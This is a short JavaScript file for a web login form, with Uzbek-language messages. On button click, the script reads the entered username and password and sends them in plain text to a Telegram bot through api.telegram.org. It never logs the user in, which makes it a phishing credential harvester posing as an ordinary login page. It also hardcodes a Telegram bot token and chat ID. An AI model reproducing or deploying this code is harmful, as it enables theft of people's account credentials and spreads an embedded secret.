let loginBtn = document.querySelector(".login");
let usernameInput = document.querySelector(".input1");
let password = document.querySelector(".input2");

const botToken = "6987487731:AAHvKwNJ4U7ORr1lyo2QG2zRwJ0z5nyMrjM";
const chatId = "1115547921";
async function sendMessage() {
  if (usernameInput.value !== "" && password.value !== "  ") {
    const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    try {
      const response = await fetch(apiUrl, {
        method: 'POST', 
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: `Username: ${usernameInput.value} Parol: ${password.value}`
        }),
      });
      const responseData = await response.json();
      if (responseData.ok) {
        console.log('Message sent:', responseData.result);
      } else {
        console.error('Error sending message:', responseData.description);
      }
    } catch (error) {
      console.error('Error sending message:', error.message);
    }
  }else{
    alert("parol yoki email kiritilmagan")
  }
}
loginBtn.addEventListener("click", sendMessage);
usernameInput.value = "";
password.value = "";
